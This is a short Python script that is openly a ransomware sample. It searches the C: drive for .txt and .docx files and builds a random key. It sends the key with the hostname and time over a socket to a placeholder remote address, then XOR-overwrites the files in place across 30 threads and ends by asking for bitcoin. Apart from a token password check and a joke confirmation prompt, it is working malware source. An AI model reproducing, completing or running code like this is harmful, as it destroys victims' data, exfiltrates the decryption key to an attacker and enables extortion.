#warning: don't run this maybe

import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

#safe password
safety = input('please enter safeguard password: ')
if safety != 'start':
    print('wrong key, qutting project...')
    quit()

#grab all files from machine
extensions = ['.txt','.docx',]
file_paths = []
for root, dirs, files, in os.walk('c:\\'):
    for file in files:
        file_path, file_ext =  os.path.splitext(root+'\\'+file)
        if file_ext in extensions:
            file_paths.append(root+'\\'+file)

for f in file_paths:
    print(f)

#make key
key = ''
encryption_level = 128 // 8
char_pool = ''

for i in range(0x00, 0xFF):
    char_pool += (chr(i))
for i in range(encryption_level):
    key += random.choice(char_pool)
host = os.getenv('COMPUTERNAME')
time = datetime.now()

#connect
ip_address = '_'
port = 12345

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f'[{time}] - {host}:{key}'.encode('utf-8'))

#encrypt shit

check = input('are you 100% sure you want to do this? ')

if check != yes:
    print('I thought you would come to your senses')
    quit()

def encrypt(key):
    pass
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except:
            print(f'failed to encrypt {file}')
        q.task_done()
    

q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt,args=(key,), daemon=True)
    thread.start()

q.join()

print('bitcoin please?')
